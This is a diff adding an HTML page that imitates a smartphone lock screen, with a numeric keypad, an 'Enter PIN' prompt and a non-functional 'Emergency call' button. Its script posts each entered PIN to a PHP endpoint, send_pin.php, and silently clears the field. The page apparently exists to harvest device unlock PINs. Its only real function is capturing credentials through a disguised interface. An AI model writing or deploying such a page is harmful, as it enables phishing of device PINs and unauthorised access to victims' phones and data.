@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter PIN</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        .pin-input {
+            font-size: 2rem;
+            letter-spacing: 10px;
+            padding: 10px;
+            margin: 20px 0;
+            width: 300px;
+            text-align: center;
+            background-color: #333;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+        }
+        .pin-input:focus {
+            outline: none;
+        }
+        .number-pad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        .number-pad div {
+            text-align: center;
+            font-size: 1.5rem;
+            color: #fff;
+            cursor: pointer;
+        }
+        .number-pad div small {
+            display: block;
+            font-size: 0.7rem;
+            color: #bbb;
+        }
+        .number-pad div:active {
+            color: #666;
+        }
+        .emergency-call {
+            margin-top: 20px;
+            color: #888;
+            font-size: 1rem;
+            text-decoration: none;
+            background-color: #333;
+            padding: 10px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Enter PIN</h1>
+        <input type="password" id="pin-input" class="pin-input" maxlength="10" readonly>
+        <div class="number-pad">
+            <div onclick="enterDigit('1')">1<small>&nbsp;</small></div>
+            <div onclick="enterDigit('2')">2<small>ABC</small></div>
+            <div onclick="enterDigit('3')">3<small>DEF</small></div>
+            <div onclick="enterDigit('4')">4<small>GHI</small></div>
+            <div onclick="enterDigit('5')">5<small>JKL</small></div>
+            <div onclick="enterDigit('6')">6<small>MNO</small></div>
+            <div onclick="enterDigit('7')">7<small>PQRS</small></div>
+            <div onclick="enterDigit('8')">8<small>TUV</small></div>
+            <div onclick="enterDigit('9')">9<small>WXYZ</small></div>
+            <div onclick="deleteDigit()">&#x232B;<small>&nbsp;</small></div>
+            <div onclick="enterDigit('0')">0<small>&nbsp;</small></div>
+            <div onclick="submitPin()">OK<small>&nbsp;</small></div>
+        </div>
+        <a href="#" class="emergency-call">Emergency call</a>
+    </div>
+
+    <script>
+        function enterDigit(digit) {
+            const input = document.getElementById('pin-input');
+            if (input.value.length < 10) {
+                input.value += digit;
+            }
+        }
+
+        function deleteDigit() {
+            const input = document.getElementById('pin-input');
+            input.value = input.value.slice(0, -1);
+        }
+
+        function submitPin() {
+            const input = document.getElementById('pin-input');
+            const pin = input.value;
+            if (pin.length >= 4) {
+                // Send the PIN to the PHP script
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'send_pin.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        // If the request is successful, reset the input field
+                        input.value = '';
+                    }
+                };
+                xhr.send('pin=' + encodeURIComponent(pin));
+            } else {
+                alert('Please enter at least 4 digits');
+            }
+        }
+    </script>
+</body>
+</html>
+
